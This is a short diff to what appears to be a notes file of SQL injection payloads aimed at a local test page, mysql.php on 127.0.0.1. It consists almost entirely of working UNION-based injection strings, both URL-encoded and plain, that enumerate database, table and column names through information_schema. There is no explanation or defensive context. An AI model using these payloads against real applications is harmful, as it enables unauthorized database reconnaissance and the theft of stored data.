@@ -3,3 +3,10 @@ http://127.0.0.1/mysql.php?a=%27union+select+TABLE_NAME,+COLUMN_NAME+from%20info
 http://127.0.0.1/mysql.php?a=%27+union+select+TABLE_NAME,+COLUMN_NAME+from+information_schema.columns+where+table_schema=%27test%27+and+table_name=%27list%27%20--%20;+--%20;%20--
 
 Database_names
+' union select distinct table_schema, 2 from information_schema.tables; -- --
+
+Tables_names
+' union select distinct table_name, 2 from information_schema.tables where table_schema="test"; -- --
+
+Column_names
+' union select distinct table_name, column_name from information_schema.columns where table_schema="test" and table_name="list"; -- --
